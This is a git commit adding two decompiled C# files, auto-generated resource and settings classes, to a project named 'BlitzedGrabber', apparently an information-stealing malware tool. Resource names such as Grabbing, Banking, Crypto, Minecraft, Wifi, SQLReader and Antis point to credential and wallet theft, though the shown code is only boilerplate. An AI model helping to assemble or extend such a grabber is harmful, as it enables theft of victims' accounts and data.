6a07e0798c173d26197a95f90da426ba2147aff2
weezyismad <106665000+weezyismad@users.noreply.github.com>
2022-06-01 13:22:41 +0200

    Add files via upload

---
+++ Properties/Resources.cs
@@ -0,0 +1,259 @@
+﻿using System;
+using System.CodeDom.Compiler;
+using System.ComponentModel;
+using System.Diagnostics;
+using System.Globalization;
+using System.Resources;
+using System.Runtime.CompilerServices;
+
+namespace BlitzedGrabber.Properties
+{
+	// Token: 0x02000021 RID: 33
+	[GeneratedCode("System.Resources.Tools.StronglyTypedResourceBuilder", "16.0.0.0")]
+	[DebuggerNonUserCode]
+	[CompilerGenerated]
+	internal class Resources
+	{
+		// Token: 0x06000094 RID: 148 RVA: 0x00009E9F File Offset: 0x0000809F
+		internal Resources()
+		{
+		}
+
+		// Token: 0x17000012 RID: 18
+		// (get) Token: 0x06000095 RID: 149 RVA: 0x00009EA7 File Offset: 0x000080A7
+		[EditorBrowsable(EditorBrowsableState.Advanced)]
+		internal static ResourceManager ResourceManager
+		{
+			get
+			{
+				if (Resources.resourceMan == null)
+				{
+					Resources.resourceMan = new ResourceManager("BlitzedGrabber.Properties.Resources", typeof(Resources).Assembly);
+				}
+				return Resources.resourceMan;
+			}
+		}
+
+		// Token: 0x17000013 RID: 19
+		// (get) Token: 0x06000096 RID: 150 RVA: 0x00009ED3 File Offset: 0x000080D3
+		// (set) Token: 0x06000097 RID: 151 RVA: 0x00009EDA File Offset: 0x000080DA
+		[EditorBrowsable(EditorBrowsableState.Advanced)]
+		internal static CultureInfo Culture
+		{
+			get
+			{
+				return Resources.resourceCulture;
+			}
+			set
+			{
+				Resources.resourceCulture = value;
+			}
+		}
+
+		// Token: 0x17000014 RID: 20
+		// (get) Token: 0x06000098 RID: 152 RVA: 0x00009EE2 File Offset: 0x000080E2
+		internal static string aesgem
+		{
+			get
+			{
+				return Resources.ResourceManager.GetString("aesgem", Resources.resourceCulture);
+			}
+		}
+
+		// Token: 0x17000015 RID: 21
+		// (get) Token: 0x06000099 RID: 153 RVA: 0x00009EF8 File Offset: 0x000080F8
+		internal static string Antis
+		{
+			get
+			{
+				return Resources.ResourceManager.GetString("Antis", Resources.resourceCulture);
+			}
+		}
+
+		// Token: 0x17000016 RID: 22
+		// (get) Token: 0x0600009A RID: 154 RVA: 0x00009F0E File Offset: 0x0000810E
+		internal static string Banking
+		{
+			get
+			{
+				return Resources.ResourceManager.GetString("Banking", Resources.resourceCulture);
+			}
+		}
+
+		// Token: 0x17000017 RID: 23
+		// (get) Token: 0x0600009B RID: 155 RVA: 0x00009F24 File Offset: 0x00008124
+		internal static string cbcrypt
+		{
+			get
+			{
+				return Resources.ResourceManager.GetString("cbcrypt", Resources.resourceCulture);
+			}
+		}
+
+		// Token: 0x17000018 RID: 24
+		// (get) Token: 0x0600009C RID: 156 RVA: 0x00009F3A File Offset: 0x0000813A
+		internal static string CommandHelper
+		{
+			get
+			{
+				return Resources.ResourceManager.GetString("CommandHelper", Resources.resourceCulture);
+			}
+		}
+
+		// Token: 0x17000019 RID: 25
+		// (get) Token: 0x0600009D RID: 157 RVA: 0x00009F50 File Offset: 0x00008150
+		internal static string Counter
+		{
+			get
+			{
+				return Resources.ResourceManager.GetString("Counter", Resources.resourceCulture);
+			}
+		}
+
+		// Token: 0x1700001A RID: 26
+		// (get) Token: 0x0600009E RID: 158 RVA: 0x00009F66 File Offset: 0x00008166
+		internal static string Crypto
+		{
+			get
+			{
+				return Resources.ResourceManager.GetString("Crypto", Resources.resourceCulture);
+			}
+		}
+
+		// Token: 0x1700001B RID: 27
+		// (get) Token: 0x0600009F RID: 159 RVA: 0x00009F7C File Offset: 0x0000817C
+		internal static string Devil
+		{
+			get
+			{
+				return Resources.ResourceManager.GetString("Devil", Resources.resourceCulture);
+			}
+		}
+
+		// Token: 0x1700001C RID: 28
+		// (get) Token: 0x060000A0 RID: 160 RVA: 0x00009F92 File Offset: 0x00008192
+		internal static string ErrorHandling
+		{
+			get
+			{
+				return Resources.ResourceManager.GetString("ErrorHandling", Resources.resourceCulture);
+			}
+		}
+
+		// Token: 0x1700001D RID: 29
+		// (get) Token: 0x060000A1 RID: 161 RVA: 0x00009FA8 File Offset: 0x000081A8
+		internal static string Grabbing
+		{
+			get
+			{
+				return Resources.ResourceManager.GetString("Grabbing", Resources.resourceCulture);
+			}
+		}
+
+		// Token: 0x1700001E RID: 30
+		// (get) Token: 0x060000A2 RID: 162 RVA: 0x00009FBE File Offset: 0x000081BE
+		internal static string Handler
+		{
+			get
+			{
+				return Resources.ResourceManager.GetString("Handler", Resources.resourceCulture);
+			}
+		}
+
+		// Token: 0x1700001F RID: 31
+		// (get) Token: 0x060000A3 RID: 163 RVA: 0x00009FD4 File Offset: 0x000081D4
+		internal static string IniFile
+		{
+			get
+			{
+				return Resources.ResourceManager.GetString("IniFile", Resources.resourceCulture);
+			}
+		}
+
+		// Token: 0x17000020 RID: 32
+		// (get) Token: 0x060000A4 RID: 164 RVA: 0x00009FEA File Offset: 0x000081EA
+		internal static string Minecraft
+		{
+			get
+			{
+				return Resources.ResourceManager.GetString("Minecraft", Resources.resourceCulture);
+			}
+		}
+
+		// Token: 0x17000021 RID: 33
+		// (get) Token: 0x060000A5 RID: 165 RVA: 0x0000A000 File Offset: 0x00008200
+		internal static string Paths
+		{
+			get
+			{
+				return Resources.ResourceManager.GetString("Paths", Resources.resourceCulture);
+			}
+		}
+
+		// Token: 0x17000022 RID: 34
+		// (get) Token: 0x060000A6 RID: 166 RVA: 0x0000A016 File Offset: 0x00008216
+		internal static string Program
+		{
+			get
+			{
+				return Resources.ResourceManager.GetString("Program", Resources.resourceCulture);
+			}
+		}
+
+		// Token: 0x17000023 RID: 35
+		// (get) Token: 0x060000A7 RID: 167 RVA: 0x0000A02C File Offset: 0x0000822C
+		internal static string Rich
+		{
+			get
+			{
+				return Resources.ResourceManager.GetString("Rich", Resources.resourceCulture);
+			}
+		}
+
+		// Token: 0x17000024 RID: 36
+		// (get) Token: 0x060000A8 RID: 168 RVA: 0x0000A042 File Offset: 0x00008242
+		internal static string SQLite
+		{
+			get
+			{
+				return Resources.ResourceManager.GetString("SQLite", Resources.resourceCulture);
+			}
+		}
+
+		// Token: 0x17000025 RID: 37
+		// (get) Token: 0x060000A9 RID: 169 RVA: 0x0000A058 File Offset: 0x00008258
+		internal static string SQLReader
+		{
+			get
+			{
+				return Resources.ResourceManager.GetString("SQLReader", Resources.resourceCulture);
+			}
+		}
+
+		// Token: 0x17000026 RID: 38
+		// (get) Token: 0x060000AA RID: 170 RVA: 0x0000A06E File Offset: 0x0000826E
+		internal static string StringsCrypt
+		{
+			get
+			{
+				return Resources.ResourceManager.GetString("StringsCrypt", Resources.resourceCulture);
+			}
+		}
+
+		// Token: 0x17000027 RID: 39
+		// (get) Token: 0x060000AB RID: 171 RVA: 0x0000A084 File Offset: 0x00008284
+		internal static string Wifi
+		{
+			get
+			{
+				return Resources.ResourceManager.GetString("Wifi", Resources.resourceCulture);
+			}
+		}
+
+		// Token: 0x04000062 RID: 98
+		private static ResourceManager resourceMan;
+
+		// Token: 0x04000063 RID: 99
+		private static CultureInfo resourceCulture;
+	}
+}
---
+++ Properties/Settings.Designer.cs
@@ -0,0 +1,26 @@
+﻿using System;
+using System.CodeDom.Compiler;
+using System.Configuration;
+using System.Runtime.CompilerServices;
+
+namespace BlitzedGrabber.Properties
+{
+	// Token: 0x02000022 RID: 34
+	[CompilerGenerated]
+	[GeneratedCode("Microsoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator", "11.0.0.0")]
+	internal sealed partial class Settings : ApplicationSettingsBase
+	{
+		// Token: 0x17000028 RID: 40
+		// (get) Token: 0x060000AC RID: 172 RVA: 0x0000A09A File Offset: 0x0000829A
+		public static Settings Default
+		{
+			get
+			{
+				return Settings.defaultInstance;
+			}
+		}
+
+		// Token: 0x04000064 RID: 100
+		private static Settings defaultInstance = (Settings)SettingsBase.Synchronized(new Settings());
+	}
+}
